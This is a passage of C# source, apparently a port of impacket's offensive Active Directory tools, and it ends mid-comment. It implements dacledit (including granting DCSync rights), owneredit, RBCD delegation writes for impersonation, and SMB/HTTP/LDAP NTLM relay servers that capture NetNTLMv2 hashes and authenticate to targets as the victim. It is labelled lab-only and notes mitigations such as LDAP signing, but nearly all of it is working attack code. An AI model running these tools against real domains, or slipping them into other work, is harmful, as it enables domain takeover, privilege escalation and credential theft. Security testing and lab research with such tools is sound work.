            Console.Error.WriteLine("  ace-type : allowed (default) | denied");
            Console.Error.WriteLine("  e.g. dacledit read  127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local Administrator");
            Console.Error.WriteLine("       dacledit write 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local target1 attacker DCSync");
            return 2;
        }

        string action = args[1];
        string host = args[2];
        string user = args[3];
        string password = args[4];
        string domainFqdn = args[5];
        string target = args[6];
        string principal = args.Length > 7 ? args[7] : string.Empty;
        string rights = args.Length > 8 ? args[8] : "FullControl";
        string aceTypeArg = args.Length > 9 ? args[9] : "allowed";
        string file = args.Length > 10 ? args[10] : string.Empty;
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
        bool denied = aceTypeArg.Equals("denied", StringComparison.OrdinalIgnoreCase);

        // Well-known rights -> ObjectType GUIDs (dacledit RIGHTS_GUID).
        const string ResetPasswordGuid = "00299570-246d-11d0-a768-00aa006e0529";
        const string WriteMembersGuid = "bf9679c0-0de6-11d0-a285-00aa003049e2";
        const string DcSyncGetChanges = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2";
        const string DcSyncGetChangesAll = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2";

        using LdapConnection ldap = LdapConnection.Connect(host, 389);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        string ResolveSid(string sam)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
                new[] { "objectSid" });
            byte[]? raw = es.Count > 0 ? es[0].GetRaw("objectSid") : null;
            return raw is null ? string.Empty : LdapSid.ToCanonical(raw);
        }

        string ResolveName(string sidString)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
            return string.IsNullOrEmpty(name) ? sidString : name;
        }

        // Fetch the target's DN + nTSecurityDescriptor (DACL only, via the SD-flags control).
        (string Dn, byte[]? Sd) FetchTargetSd()
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", target)),
                new[] { "distinguishedName", "nTSecurityDescriptor" },
                sdFlags: LdapConnection.SdFlagsDacl);
            if (es.Count == 0)
            {
                return (string.Empty, null);
            }

            return (es[0].Get("distinguishedName"), es[0].GetRaw("nTSecurityDescriptor"));
        }

        // Build the ACE(s) for the requested right, granted to principalSid.
        List<NtAce> BuildAces(string principalSid)
        {
            byte[] sid = LdapSid.FromCanonical(principalSid);
            NtAce Std(uint mask) => new()
            {
                AceType = denied ? NtAce.AccessDenied : NtAce.AccessAllowed,
                Mask = mask,
                Sid = sid,
            };
            NtAce Obj(uint mask, string guid) => new()
            {
                AceType = denied ? NtAce.AccessDeniedObject : NtAce.AccessAllowedObject,
                Mask = mask,
                ObjectType = new Guid(guid),
                Sid = sid,
            };

            var list = new List<NtAce>();
            if (rights.Equals("FullControl", StringComparison.OrdinalIgnoreCase))
            {
                list.Add(Std(0x000F01FF));
            }
            else if (rights.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
            {
                list.Add(Std(Convert.ToUInt32(rights, 16)));
            }
            else if (rights.Equals("ResetPassword", StringComparison.OrdinalIgnoreCase))
            {
                list.Add(Obj(NtAce.AdsRightDsControlAccess, ResetPasswordGuid));
            }
            else if (rights.Equals("WriteMembers", StringComparison.OrdinalIgnoreCase))
            {
                list.Add(Obj(NtAce.AdsRightDsReadProp | NtAce.AdsRightDsWriteProp, WriteMembersGuid));
            }
            else if (rights.Equals("DCSync", StringComparison.OrdinalIgnoreCase))
            {
                list.Add(Obj(NtAce.AdsRightDsControlAccess, DcSyncGetChanges));
                list.Add(Obj(NtAce.AdsRightDsControlAccess, DcSyncGetChangesAll));
            }
            else
            {
                Console.Error.WriteLine($"Unknown rights '{rights}'.");
            }

            return list;
        }

        string DescribeMask(uint mask)
        {
            var names = new List<string>();
            foreach ((string n, uint v) in new[]
            {
                ("FullControl", 0xf01ffu), ("GenericAll", 0x10000000u), ("GenericWrite", 0x40000000u),
                ("GenericRead", 0x80000000u), ("WriteDACL", 0x00040000u), ("WriteOwner", 0x00080000u),
                ("ControlAccess", 0x00000100u), ("WriteProp", 0x00000020u), ("ReadProp", 0x00000010u),
                ("Self", 0x00000008u), ("CreateChild", 0x00000001u),
            })
            {
                if ((mask & v) == v && v != 0)
                {
                    names.Add(n);
                }
            }

            return names.Count == 0 ? "-" : string.Join(", ", names);
        }

        if (action is "read")
        {
            (string dn, byte[]? sdBytes) = FetchTargetSd();
            if (sdBytes is null)
            {
                Console.Error.WriteLine($"Target not found or no SD: {target}");
                return 1;
            }

            string filterSid = string.IsNullOrEmpty(principal) ? string.Empty : ResolveSid(principal);
            NtSecurityDescriptor sd = NtSecurityDescriptor.Parse(sdBytes);
            Console.WriteLine($"DACL of {dn} ({sd.Dacl?.Aces.Count ?? 0} ACEs)"
                + (string.IsNullOrEmpty(filterSid) ? string.Empty : $"  [filtered to {principal} / {filterSid}]"));
            int i = 0;
            foreach (NtAce ace in sd.Dacl?.Aces ?? new List<NtAce>())
            {
                string aceSid = LdapSid.ToCanonical(ace.Sid);
                if (!string.IsNullOrEmpty(filterSid) && aceSid != filterSid)
                {
                    i++;
                    continue;
                }

                string kind = ace.AceType switch
                {
                    NtAce.AccessAllowed => "ALLOW     ",
                    NtAce.AccessDenied => "DENY      ",
                    NtAce.AccessAllowedObject => "ALLOW-OBJ ",
                    NtAce.AccessDeniedObject => "DENY-OBJ  ",
                    _ => $"TYPE 0x{ace.AceType:X2} ",
                };
                string guid = ace.ObjectType is { } g ? $"  object={g}" : string.Empty;
                Console.WriteLine($"  [{i,2}] {kind} 0x{ace.Mask:X8} ({DescribeMask(ace.Mask)})  {ResolveName(aceSid)} ({aceSid}){guid}");
                i++;
            }

            return 0;
        }

        if (action is "backup")
        {
            (string dn, byte[]? sdBytes) = FetchTargetSd();
            if (sdBytes is null)
            {
                Console.Error.WriteLine($"Target not found or no SD: {target}");
                return 1;
            }

            string path = string.IsNullOrEmpty(file)
                ? System.IO.Path.Combine(System.IO.Path.GetTempPath(), $"dacledit-{DateTime.Now:yyyyMMdd-HHmmss}.bak")
                : file;
            System.IO.File.WriteAllText(path, $"{dn}\n{Convert.ToHexString(sdBytes)}");
            Console.WriteLine($"[+] Backed up DACL of {dn} ({sdBytes.Length} bytes) to {path}");
            return 0;
        }

        if (action is "restore")
        {
            if (string.IsNullOrEmpty(file) || !System.IO.File.Exists(file))
            {
                Console.Error.WriteLine("restore needs an existing <file> (as the 10th argument).");
                return 2;
            }

            string[] lines = System.IO.File.ReadAllLines(file);
            string dn = lines[0];
            byte[] sdBytes = Convert.FromHexString(lines[1].Trim());
            LdapResult res = ldap.ModifyReplace(dn, "nTSecurityDescriptor",
                new[] { sdBytes }, sdFlags: LdapConnection.SdFlagsDacl);
            Console.WriteLine(res.Success
                ? $"[+] Restored DACL on {dn}"
                : $"[-] Restore failed (result {res.ResultCode}): {res.DiagnosticMessage}");
            return res.Success ? 0 : 1;
        }

        // write / remove both need a principal.
        if (string.IsNullOrEmpty(principal))
        {
            Console.Error.WriteLine($"'{action}' needs a <principal> (the trustee getting/losing the ACE).");
            return 2;
        }

        string pSid = ResolveSid(principal);
        if (string.IsNullOrEmpty(pSid))
        {
            Console.Error.WriteLine($"Principal not found: {principal}");
            return 1;
        }

        (string targetDn, byte[]? curSd) = FetchTargetSd();
        if (curSd is null)
        {
            Console.Error.WriteLine($"Target not found or no SD: {target}");
            return 1;
        }

        NtSecurityDescriptor desc = NtSecurityDescriptor.Parse(curSd);
        desc.Dacl ??= new NtAcl();
        List<NtAce> templates = BuildAces(pSid);
        if (templates.Count == 0)
        {
            return 1;
        }

        if (action is "write")
        {
            // Backup first (mirrors dacledit), then append the ACE(s) and push.
            string backupPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), $"dacledit-{DateTime.Now:yyyyMMdd-HHmmss}.bak");
            System.IO.File.WriteAllText(backupPath, $"{targetDn}\n{Convert.ToHexString(curSd)}");
            foreach (NtAce ace in templates)
            {
                desc.Dacl.Aces.Add(ace);
            }

            LdapResult res = ldap.ModifyReplace(targetDn, "nTSecurityDescriptor",
                new[] { desc.GetData() }, sdFlags: LdapConnection.SdFlagsDacl);
            Console.WriteLine(res.Success
                ? $"[+] Granted {principal} ({pSid}) {rights} on {targetDn} (backup: {backupPath})"
                : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
            return res.Success ? 0 : 1;
        }

        if (action is "remove")
        {
            int before = desc.Dacl.Aces.Count;
            bool Matches(NtAce a, NtAce t) =>
                a.AceType == t.AceType && a.Mask == t.Mask
                && LdapSid.ToCanonical(a.Sid) == LdapSid.ToCanonical(t.Sid)
                && a.ObjectType == t.ObjectType;
            desc.Dacl.Aces.RemoveAll(a => templates.Exists(t => Matches(a, t)));
            int removed = before - desc.Dacl.Aces.Count;
            if (removed == 0)
            {
                Console.WriteLine("Nothing to remove (no matching ACE).");
                return 0;
            }

            LdapResult res = ldap.ModifyReplace(targetDn, "nTSecurityDescriptor",
                new[] { desc.GetData() }, sdFlags: LdapConnection.SdFlagsDacl);
            Console.WriteLine(res.Success
                ? $"[+] Removed {removed} ACE(s) for {principal} ({pSid}) on {targetDn}"
                : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
            return res.Success ? 0 : 1;
        }

        Console.Error.WriteLine($"Unknown action '{action}' (use read|write|remove|backup|restore).");
        return 2;
    }

    case "owneredit":
    {
        // owneredit.py: read or change the Owner (OwnerSid) of an AD object's security descriptor.
        //   read  — search the target's nTSecurityDescriptor (SD-flags control = OWNER only, 0x01),
        //           parse the OwnerSid and print it (SID + resolved name).
        //   write — replace OwnerSid with <new-owner>'s SID, then ModifyReplace nTSecurityDescriptor
        //           with the same OWNER-only control. Taking ownership is the precondition for then
        //           rewriting the DACL (cf. dacledit). LAB-ONLY; see docs.
        if (args.Length < 7)
        {
            Console.Error.WriteLine("usage: owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]");
            Console.Error.WriteLine("  e.g. owneredit read  127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local Administrator");
            Console.Error.WriteLine("       owneredit write 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local target1 attacker");
            return 2;
        }

        string action = args[1];
        string host = args[2];
        string user = args[3];
        string password = args[4];
        string domainFqdn = args[5];
        string target = args[6];
        string newOwner = args.Length > 7 ? args[7] : string.Empty;
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";

        using LdapConnection ldap = LdapConnection.Connect(host, 389);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        string ResolveSid(string sam)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
                new[] { "objectSid" });
            byte[]? raw = es.Count > 0 ? es[0].GetRaw("objectSid") : null;
            return raw is null ? string.Empty : LdapSid.ToCanonical(raw);
        }

        string ResolveName(string sidString)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
            return string.IsNullOrEmpty(name) ? sidString : name;
        }

        // Fetch the target's DN + nTSecurityDescriptor (OWNER only, via the SD-flags control 0x01).
        IReadOnlyList<SearchEntry> hits = ldap.Search(baseDn,
            LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", target)),
            new[] { "distinguishedName", "nTSecurityDescriptor" },
            sdFlags: LdapConnection.SdFlagsOwner);
        if (hits.Count == 0 || hits[0].GetRaw("nTSecurityDescriptor") is not { } sdBytes)
        {
            Console.Error.WriteLine($"Target not found or no SD: {target}");
            return 1;
        }

        string targetDn = hits[0].Get("distinguishedName");
        NtSecurityDescriptor sd = NtSecurityDescriptor.Parse(sdBytes);
        string currentOwner = LdapSid.ToCanonical(sd.OwnerSid);
        Console.WriteLine($"Target: {targetDn}");
        Console.WriteLine($"Current owner: {ResolveName(currentOwner)} ({currentOwner})");

        if (action is "read")
        {
            return 0;
        }

        if (action is not "write")
        {
            Console.Error.WriteLine($"Unknown action '{action}' (use read|write).");
            return 2;
        }

        if (string.IsNullOrEmpty(newOwner))
        {
            Console.Error.WriteLine("write needs a <new-owner> (sAMAccountName).");
            return 2;
        }

        string newOwnerSid = ResolveSid(newOwner);
        if (string.IsNullOrEmpty(newOwnerSid))
        {
            Console.Error.WriteLine($"New owner not found: {newOwner}");
            return 1;
        }

        sd.OwnerSid = LdapSid.FromCanonical(newOwnerSid);
        LdapResult res = ldap.ModifyReplace(targetDn, "nTSecurityDescriptor",
            new[] { sd.GetData() }, sdFlags: LdapConnection.SdFlagsOwner);
        Console.WriteLine(res.Success
            ? $"[+] Owner of {targetDn} set to {newOwner} ({newOwnerSid})"
            : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
        return res.Success ? 0 : 1;
    }

    case "rbcd":
    {
        // rbcd.py: read/edit msDS-AllowedToActOnBehalfOfOtherIdentity (Resource-Based Constrained
        // Delegation). The attribute holds a security descriptor whose DACL lists the SIDs allowed
        // to act on behalf of other identities against the target (via S4U2Proxy).
        //   read   — list the accounts currently allowed to act on the target.
        //   write  — add an allow ACE (FullControl 0xF01FF) for <delegate-from>'s SID.
        //   remove — drop ACEs matching <delegate-from>'s SID.
        //   flush  — clear the attribute entirely.
        // Unlike dacledit/owneredit this is a plain attribute, so there is NO SD-flags control.
        // LAB-ONLY (the delegation primitive for a Kerberos RBCD attack); see docs.
        if (args.Length < 7)
        {
            Console.Error.WriteLine("usage: rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]");
            Console.Error.WriteLine("  delegate-to   : the target account whose rbcd property is read/edited (a computer account ends in $)");
            Console.Error.WriteLine("  delegate-from : the attacker-controlled account to grant (write/remove)");
            Console.Error.WriteLine("  e.g. rbcd read  127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local 'VICTIM$'");
            Console.Error.WriteLine("       rbcd write 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local 'VICTIM$' 'ATTACKER$'");
            return 2;
        }

        string action = args[1];
        string host = args[2];
        string user = args[3];
        string password = args[4];
        string domainFqdn = args[5];
        string delegateTo = args[6];
        string delegateFrom = args.Length > 7 ? args[7] : string.Empty;
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
        const string RbcdAttr = "msDS-AllowedToActOnBehalfOfOtherIdentity";

        using LdapConnection ldap = LdapConnection.Connect(host, 389);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        // sAMAccountName -> (DN, SID).
        (string Dn, string Sid) GetUserInfo(string sam)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
                new[] { "distinguishedName", "objectSid" });
            if (es.Count == 0)
            {
                return (string.Empty, string.Empty);
            }

            byte[]? sidRaw = es[0].GetRaw("objectSid");
            return (es[0].Get("distinguishedName"), sidRaw is null ? string.Empty : LdapSid.ToCanonical(sidRaw));
        }

        string ResolveName(string sidString)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
            return string.IsNullOrEmpty(name) ? sidString : name;
        }

        (string dn, string _) = GetUserInfo(delegateTo);
        if (string.IsNullOrEmpty(dn))
        {
            Console.Error.WriteLine($"Account to modify does not exist: {delegateTo} (computer accounts end in $)");
            return 1;
        }

        // BASE-read the target's current rbcd attribute; build its SD (or an empty one if absent).
        NtSecurityDescriptor ReadSd()
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(dn,
                LdapFilter.PresentOf("objectClass"), new[] { RbcdAttr }, LdapSearchScope.BaseObject);
            byte[]? raw = es.Count > 0 ? es[0].GetRaw(RbcdAttr) : null;
            if (raw is { Length: > 0 })
            {
                return NtSecurityDescriptor.Parse(raw);
            }

            // create_empty_sd(): Control 0x8004, owner BUILTIN\Administrators, empty DACL.
            return new NtSecurityDescriptor
            {
                Control = 0x8004,
                OwnerSid = LdapSid.FromCanonical("S-1-5-32-544"),
                Dacl = new NtAcl(),
            };
        }

        void PrintAllowed(NtSecurityDescriptor sd)
        {
            List<NtAce> aces = sd.Dacl?.Aces ?? new List<NtAce>();
            if (aces.Count == 0)
            {
                Console.WriteLine("  msDS-AllowedToActOnBehalfOfOtherIdentity is empty.");
                return;
            }

            Console.WriteLine("  Accounts allowed to act on behalf of other identity:");
            foreach (NtAce ace in aces)
            {
                string s = LdapSid.ToCanonical(ace.Sid);
                Console.WriteLine($"    {ResolveName(s),-20} ({s})");
            }
        }

        Console.WriteLine($"Target: {dn}");

        if (action is "read")
        {
            PrintAllowed(ReadSd());
            return 0;
        }

        if (action is "flush")
        {
            LdapResult res = ldap.ModifyReplace(dn, RbcdAttr, Array.Empty<byte[]>());
            Console.WriteLine(res.Success
                ? "[+] Delegation rights flushed."
                : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
            return res.Success ? 0 : 1;
        }

        // write / remove need delegate-from.
        if (string.IsNullOrEmpty(delegateFrom))
        {
            Console.Error.WriteLine($"'{action}' needs a <delegate-from> account.");
            return 2;
        }

        (string _, string fromSid) = GetUserInfo(delegateFrom);
        if (string.IsNullOrEmpty(fromSid))
        {
            Console.Error.WriteLine($"Account to escalate does not exist: {delegateFrom}");
            return 1;
        }

        NtSecurityDescriptor sd = ReadSd();
        sd.Dacl ??= new NtAcl();

        if (action is "write")
        {
            if (sd.Dacl.Aces.Exists(a => LdapSid.ToCanonical(a.Sid) == fromSid))
            {
                Console.WriteLine($"{delegateFrom} ({fromSid}) can already act on behalf of {delegateTo}. Not modifying.");
                return 0;
            }

            sd.Dacl.Aces.Add(new NtAce
            {
                AceType = NtAce.AccessAllowed,
                Mask = 983551, // 0xF01FF full control, as rbcd.create_allow_ace
                Sid = LdapSid.FromCanonical(fromSid),
            });
            LdapResult res = ldap.ModifyReplace(dn, RbcdAttr, new[] { sd.GetData() });
            if (res.Success)
            {
                Console.WriteLine($"[+] {delegateFrom} ({fromSid}) can now impersonate users on {delegateTo} via S4U2Proxy.");
                PrintAllowed(ReadSd());
                return 0;
            }

            Console.Error.WriteLine($"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
            return 1;
        }

        if (action is "remove")
        {
            int removed = sd.Dacl.Aces.RemoveAll(a => LdapSid.ToCanonical(a.Sid) == fromSid);
            if (removed == 0)
            {
                Console.WriteLine($"{delegateFrom} ({fromSid}) is not in the list. Nothing to remove.");
                return 0;
            }

            LdapResult res = ldap.ModifyReplace(dn, RbcdAttr, new[] { sd.GetData() });
            Console.WriteLine(res.Success
                ? $"[+] Removed {delegateFrom} ({fromSid}) from the delegation list."
                : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
            return res.Success ? 0 : 1;
        }

        Console.Error.WriteLine($"Unknown action '{action}' (use read|write|remove|flush).");
        return 2;
    }

    case "ntlmrelayx":
    {
        // ntlmrelayx.py (SMB->SMB relay core): an SMB2 server that relays a victim's NTLM
        // authentication to a target SMB server. The victim's AUTHENTICATE is computed against the
        // TARGET's challenge (which we relay back), so a successful relay authenticates us to the
        // target as the victim. See impacket examples/ntlmrelayx/servers/smbrelayserver.py.
        //
        // LAB-ONLY. For a self-contained loopback demo, pass victim creds and the example drives a
        // victim against its own listener; the relay forwards to <target-host>. With no victim creds
        // it listens and relays the next real inbound SMB connection (the classic coerced-auth setup).
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: ntlmrelayx <target-host> [listen-port=4455] [victim-user victim-pass [domain]]");
            Console.Error.WriteLine("  demo (loopback): ntlmrelayx 127.0.0.1 4455 Administrator 'LabAdm1n!Pass' lab.local");
            Console.Error.WriteLine("  listen only    : ntlmrelayx <target-host> [listen-port]");
            return 2;
        }

        string targetHost = args[1];
        int listenPort = args.Length > 2 ? int.Parse(args[2]) : 4455;
        bool haveVictim = args.Length >= 5;
        string vUser = haveVictim ? args[3] : string.Empty;
        string vPass = haveVictim ? args[4] : string.Empty;
        string vDomain = args.Length > 5 ? args[5] : string.Empty;

        using var server = new Smb2RelayServer(listenPort, System.Net.IPAddress.Loopback);
        server.Start();
        Console.WriteLine($"[*] ntlmrelayx (SMB->SMB) listening on 127.0.0.1:{server.Port}, relaying to {targetHost}");

        // Open the relay connection to the real target up front (NEGOTIATE done here).
        using var target = new Smb2RelayClientTarget(targetHost);

        // Optional loopback victim: authenticate against our own listener in the background.
        System.Threading.Tasks.Task? victimTask = null;
        if (haveVictim)
        {
            Console.WriteLine($"[*] (demo) driving a victim '{vUser}' against the listener");
            victimTask = System.Threading.Tasks.Task.Run(() =>
            {
                using var victim = new Smb2Client();
                victim.Connect("127.0.0.1", listenPort);
                victim.Negotiate();
                victim.Login(vDomain, vUser, vPass);
            });
        }
        else
        {
            Console.WriteLine("[*] waiting for an inbound SMB connection to relay...");
        }

        Smb2RelayOutcome outcome = server.AcceptAndRelay(target);

        Console.WriteLine($"[*] victim {outcome.VictimEndpoint} relayed to {targetHost}");
        Console.WriteLine($"    relayed challenge (target's): {Convert.ToHexString(outcome.RelayedChallenge).ToLowerInvariant()}");

        // Harvest the NetNTLMv2 hash from the victim's AUTHENTICATE + the (relayed) server challenge —
        // the same crackable material impacket's SMB server logs for every capture.
        try
        {
            byte[] serverChallenge = NtlmChallenge.Parse(outcome.RelayedChallenge).ServerChallenge;
            NtlmAuthenticate victimAuth = NtlmAuthenticate.Parse(outcome.VictimAuthenticate);
            Console.WriteLine($"[+] Captured NetNTLMv2 hash:");
            Console.WriteLine($"    {NetNtlmv2.Format(serverChallenge, victimAuth)}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"    (could not format captured hash: {ex.Message})");
        }

        if (outcome.Relayed)
        {
            Console.WriteLine($"[+] Relay SUCCEEDED: authenticated to {targetHost} as the victim (target session 0x{target.Client.SessionId:X}).");
        }
        else
        {
            Console.WriteLine($"[-] Relay failed: target returned {NtStatus.Describe(outcome.TargetStatus)} (0x{outcome.TargetStatus:X8}).");
        }

        try { victimTask?.Wait(5000); } catch { /* victim may error after relay completes; not fatal */ }
        return outcome.Relayed ? 0 : 1;
    }

    case "ntlmrelayx-http":
    {
        // ntlmrelayx.py HTTP relay server: an HTTP endpoint that coerces NTLM (WWW-Authenticate: NTLM)
        // and relays the victim's authentication to a target SMB server. The common coerced-auth
        // vector (PetitPotam/PrinterBug over HTTP/WebDAV). See
        // examples/ntlmrelayx/servers/httprelayserver.py. LAB-ONLY; loopback demo as with the SMB relay.
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: ntlmrelayx-http <target-host> [listen-port=8080] [victim-user victim-pass [domain]]");
            Console.Error.WriteLine("  demo (loopback): ntlmrelayx-http 127.0.0.1 8080 Administrator 'LabAdm1n!Pass' lab.local");
            return 2;
        }

        string targetHost = args[1];
        int listenPort = args.Length > 2 ? int.Parse(args[2]) : 8080;
        bool haveVictim = args.Length >= 5;
        string vUser = haveVictim ? args[3] : string.Empty;
        string vPass = haveVictim ? args[4] : string.Empty;
        string vDomain = args.Length > 5 ? args[5] : string.Empty;

        using var httpServer = new HttpRelayServer(listenPort, System.Net.IPAddress.Loopback);
        httpServer.Start();
        Console.WriteLine($"[*] ntlmrelayx (HTTP->SMB) listening on http://127.0.0.1:{httpServer.Port}/, relaying to {targetHost}");
        using var httpTarget = new Smb2RelayClientTarget(targetHost);

        System.Threading.Tasks.Task? victimTask = null;
        if (haveVictim)
        {
            Console.WriteLine($"[*] (demo) driving an HTTP victim '{vUser}' against the listener");
            victimTask = System.Threading.Tasks.Task.Run(() => HttpNtlmVictim("127.0.0.1", listenPort, vDomain, vUser, vPass));
        }
        else
        {
            Console.WriteLine("[*] waiting for an inbound HTTP connection to relay...");
        }

        HttpRelayOutcome result = httpServer.AcceptAndRelay(httpTarget);
        Console.WriteLine($"[*] victim {result.VictimEndpoint} ({result.RequestLine}) relayed to {targetHost}");
        Console.WriteLine($"    relayed challenge (target's): {Convert.ToHexString(result.RelayedChallenge).ToLowerInvariant()}");
        try
        {
            byte[] serverChallenge = NtlmChallenge.Parse(result.RelayedChallenge).ServerChallenge;
            NtlmAuthenticate victimAuth = NtlmAuthenticate.Parse(result.VictimAuthenticate);
            Console.WriteLine("[+] Captured NetNTLMv2 hash:");
            Console.WriteLine($"    {NetNtlmv2.Format(serverChallenge, victimAuth)}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"    (could not format captured hash: {ex.Message})");
        }

        Console.WriteLine(result.Relayed
            ? $"[+] Relay SUCCEEDED: authenticated to {targetHost} as the victim (target session 0x{httpTarget.Client.SessionId:X})."
            : $"[-] Relay failed: target returned {NtStatus.Describe(result.TargetStatus)} (0x{result.TargetStatus:X8}).");

        try { victimTask?.Wait(5000); } catch { /* victim may error after relay completes; not fatal */ }
        return result.Relayed ? 0 : 1;
    }

    case "ntlmrelayx-ldap":
    {
        // ntlmrelayx.py ldapattack: relay a victim's NTLM to the DC's LDAP, bind as the victim, then
        // act over that authenticated channel (here: a whoami-style search; the rbcd/dacledit/
        // addcomputer write primitives can run on the same bound connection). See
        // examples/ntlmrelayx/attacks/ldapattack.py. LAB-ONLY; loopback demo.
        //
        // Note: a DC that enforces LDAP signing / channel binding rejects the unsigned relayed bind.
        // That rejection is the intended mitigation and a faithful outcome to capture.
        if (args.Length < 6)
        {
            Console.Error.WriteLine("usage: ntlmrelayx-ldap <dc-host> <listen-port> <victim-user> <victim-pass> <domain-fqdn>");
            Console.Error.WriteLine("  demo (loopback): ntlmrelayx-ldap 127.0.0.1 4457 Administrator 'LabAdm1n!Pass' lab.local");
            return 2;
        }

        string dcHost = args[1];
        int listenPort = int.Parse(args[2]);
        string vUser = args[3];
        string vPass = args[4];
        string domainFqdn = args[5];
        string netbios = domainFqdn.Split('.')[0].ToUpperInvariant();
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");

        using var relayServer = new Smb2RelayServer(listenPort, System.Net.IPAddress.Loopback);
        relayServer.Start();
        Console.WriteLine($"[*] ntlmrelayx (SMB->LDAP) listening on 127.0.0.1:{relayServer.Port}, relaying to ldap://{dcHost}");
        using var ldapTarget = new LdapRelayClientTarget(dcHost);

        Console.WriteLine($"[*] (demo) driving a victim '{vUser}' against the listener");
        var victimTask = System.Threading.Tasks.Task.Run(() =>
        {
            using var victim = new Smb2Client();
            victim.Connect("127.0.0.1", listenPort);
            victim.Negotiate();
            victim.Login(netbios, vUser, vPass);
        });

        Smb2RelayOutcome outcome;
        try
        {
            outcome = relayServer.AcceptAndRelay(ldapTarget);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[-] Relay to LDAP failed during the bind: {ex.Message}");
            Console.Error.WriteLine("    (A DC enforcing LDAP signing / channel binding rejects an unsigned relayed bind — the mitigation.)");
            try { victimTask.Wait(3000); } catch { }
            return 1;
        }

        Console.WriteLine($"[*] victim {outcome.VictimEndpoint} relayed to ldap://{dcHost}");
        try
        {
            byte[] serverChallenge = NtlmChallenge.Parse(outcome.RelayedChallenge).ServerChallenge;
            NtlmAuthenticate victimAuth = NtlmAuthenticate.Parse(outcome.VictimAuthenticate);
            Console.WriteLine($"[+] Captured NetNTLMv2 hash:\n    {NetNtlmv2.Format(serverChallenge, victimAuth)}");
        }
        catch { /* best-effort */ }

        if (!outcome.Relayed)
        {
            Console.Error.WriteLine($"[-] Relayed LDAP bind rejected (LDAP result {outcome.TargetStatus}).");
            Console.Error.WriteLine("    This is the LDAP-signing / channel-binding mitigation working as intended.");
            try { victimTask.Wait(3000); } catch { }
            return 1;
        }

        Console.WriteLine($"[+] Relayed LDAP bind SUCCEEDED: the DC authenticated the bind as the victim (LDAP result 0).");
        // Post-relay action: a whoami-style search over the authenticated channel (writes could follow).
        try
        {
            IReadOnlyList<SearchEntry> es = ldapTarget.Ldap.Search(baseDn,
                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", vUser)),
                new[] { "distinguishedName", "objectSid" });
            if (es.Count > 0)
            {
                Console.WriteLine($"    whoami (as relayed victim): {es[0].Get("distinguishedName")}");
                Console.WriteLine("    [i] rbcd / dacledit / addcomputer write primitives can now run over this bound connection.");
            }
        }
        catch (Exception ex) when (ex is IOException or System.Net.Sockets.SocketException)
        {
            // The relayed NTLM bind negotiated signing/sealing; a DC that enforces LDAP integrity
